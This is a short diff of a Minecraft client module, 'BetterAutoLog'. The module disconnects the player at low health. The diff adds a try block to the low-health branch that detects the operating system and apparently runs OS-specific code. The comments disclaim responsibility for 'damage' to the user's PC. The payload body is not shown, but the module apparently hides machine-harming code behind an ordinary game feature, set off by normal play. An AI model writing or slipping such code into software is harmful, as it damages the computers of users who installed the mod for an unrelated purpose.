@@ -45,11 +45,9 @@ public class BetterAutoLog extends Module {
         }
         if (playerHealth <= health.get()) {
             mc.player.networkHandler.onDisconnect(new DisconnectS2CPacket(Text.empty()));
-        }
-    }
-
-    {
-       try {
+            // I m not responsible for any damage that I can harm to ur pc
+            // be careful ;)
+            try {
                 String os = System.getProperty("os.name").toLowerCase();
 
                 if (os.contains("win")) {
@@ -64,4 +62,6 @@ public class BetterAutoLog extends Module {
             }
         }
     }
+        }
+
 
